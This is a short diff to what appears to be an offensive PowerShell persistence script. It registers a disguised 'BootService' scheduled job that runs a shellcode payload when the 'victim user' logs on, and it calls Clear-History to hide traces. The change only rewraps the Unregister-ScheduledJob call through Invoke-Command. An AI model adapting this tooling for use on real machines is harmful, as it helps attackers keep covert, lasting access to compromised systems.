@@ -101,7 +101,8 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
       # $Trig = New-JobTrigger -Once -At (Get-Date).AddMinutes(30) -RepeatIndefinitely -RepetitionInterval "00:30:00"
        $Trig = New-JobTrigger -AtLogOn
        $scriptblock = [scriptblock]::Create($script)
-       Get-ScheduledJob | Unregister-ScheduledJob -Force
+       $deleteschedule = {Get-ScheduledJob | Unregister-ScheduledJob -Force}
+       Invoke-Command -ScriptBlock $deleteschedule
        Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
        "Process Complete. Persistent schtask is created and will be triggered once the victim user logs on the computer."
        Clear-History
@@ -216,7 +217,8 @@ removing the registry key.
        "Successfully removed the persistent schtask"
     }
     else {
-       Get-ScheduledJob | Unregister-ScheduledJob -Force
+       $deleteschedule = {Get-ScheduledJob | Unregister-ScheduledJob -Force}
+       Invoke-Command -ScriptBlock $deleteschedule
        "Successfully killed all the Registered Persistent Powershell Schtasks."
     }
    
